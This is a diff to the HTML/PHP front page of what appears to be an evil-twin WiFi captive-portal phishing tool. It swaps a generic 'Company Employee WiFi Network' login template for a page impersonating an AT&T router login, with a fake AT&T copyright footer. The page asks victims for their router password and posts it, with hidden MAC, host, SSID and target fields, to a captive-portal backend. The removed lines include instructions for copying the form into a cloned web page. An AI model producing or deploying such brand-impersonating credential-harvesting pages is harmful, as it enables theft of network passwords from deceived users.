@@ -41,50 +41,73 @@ $inputValues = array(
 ?>
 <!DOCTYPE html>
 <html lang="en">
-	<head>
-		<meta charset="UTF-8">
-		<!-- change title to your liking -->
-		<title>Company&#8482; | Employee WiFi Network</title>
-		<meta name="author" content="Ivan Šincek">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<link rel="stylesheet" href="./css/main.css" hreflang="en" type="text/css" media="all">
-	</head>
-	<body class="background-img">
-		<div class="front-form">
-			<div class="layout">
-				<div class="logo">
-					<img src="./img/logo.png" alt="Logo">
-				</div>
-				<!-- change headers to your liking -->
-				<header>
-					<h1 class="title">Company&#8482;</h1>
-					<h1 class="subtitle">Employee WiFi Network</h1>
-				</header>
-				<!-- copy and paste this form attributes to the cloned web page form -->
-				<form method="post" action="./captiveportal/index.php">
-					<!-- make sure to correctly modify form input fields on the cloned web page -->
-					<!-- because backend will only accept "username", "email", and "password" input fields in addition to "mac", "host", "ssid", and "target" input fileds -->
-					<input name="username" id="username" type="text" spellcheck="false" placeholder="Username" required="required">
-					<!-- <input name="email" id="email" type="text" spellcheck="false" placeholder="Email" required="required"> -->
-					<!-- you can add your own regular expression attribute in the email input field to limit the scope -->
-					<!-- pattern="^[^\s]+@company\.com$" -->
-					<!-- or you can use the universal one -->
-					<!-- pattern="^(([^<>()\[\]\\.,;:\s@\u0022]+(\.[^<>()\[\]\\.,;:\s@\u0022]+)*)|(\u0022.+\u0022))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$" -->
-					<input name="password" id="password" type="password" placeholder="Password" required="required">
-					<!-- do not forget to copy these hidden input fields -->
-					<input name="mac" id="mac" type="hidden" value="<?php echo $inputValues['mac']; ?>">
-					<input name="host" id="host" type="hidden" value="<?php echo $inputValues['host']; ?>">
-					<input name="ssid" id="ssid" type="hidden" value="<?php echo $inputValues['ssid']; ?>">
-					<input name="target" id="target" type="hidden" value="<?php echo $inputValues['target']; ?>">
-					<input type="submit" value="Sign In">
-					<!-- display a custom message after submitting the form -->
-					<?php if (findParameter($_SERVER['REQUEST_URI'], 'status', 'success')): ?>
-						<p class="message">Signed in successfully!</p>
-					<?php elseif (findParameter($_SERVER['REQUEST_URI'], 'status', 'error')): ?>
-						<p class="message">Ups! Failed to sign in...</p>
-					<?php endif; ?>
-				</form>
-			</div>
-		</div>
-	</body>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AT&T Router Login</title>
+  <link rel="stylesheet" href="./css/main.css" hreflang="en" type="text/css" media="all">
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+        <line x1="12" y1="20" x2="12" y2="20"></line>
+      </svg>
+      <span>AT&T Router</span>
+    </div>
+
+    <?php if ($error): ?>
+    <div class="status-message error">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"></circle>
+        <line x1="12" y1="8" x2="12" y2="12"></line>
+        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+      </svg>
+      <span>Incorrect password. Please try again.</span>
+    </div>
+    <?php endif; ?>
+
+    <?php if ($success): ?>
+    <div class="status-message success">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+      </svg>
+      <span>Successfully authenticated. You may now access the internet.</span>
+    </div>
+    <?php endif; ?>
+
+    <div class="content">
+      <h1>Welcome</h1>
+      <p>Please enter your router password to access the internet</p>
+    </div>
+
+    <form method="POST" action="./captiveportal/index.php">
+      <div class="form-group">
+        <label for="password">Router Password</label>
+        <div class="input-wrapper">
+          <input type="password" id="password" name="password" placeholder="Enter password" required>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+        </div>
+      </div>
+
+      <input name="mac" id="mac" type="hidden" value="<?php echo $inputValues['mac']; ?>">
+      <input name="host" id="host" type="hidden" value="<?php echo $inputValues['host']; ?>">
+      <input name="ssid" id="ssid" type="hidden" value="<?php echo $inputValues['ssid']; ?>">
+      <input name="target" id="target" type="hidden" value="<?php echo $inputValues['target']; ?>">
+
+      <button type="submit">Connect</button>
+    </form>
+
+    <div class="footer">
+      <p>© 2025 AT&T Intellectual Property. All rights reserved.</p>
+    </div>
+  </div>
+</body>
 </html>
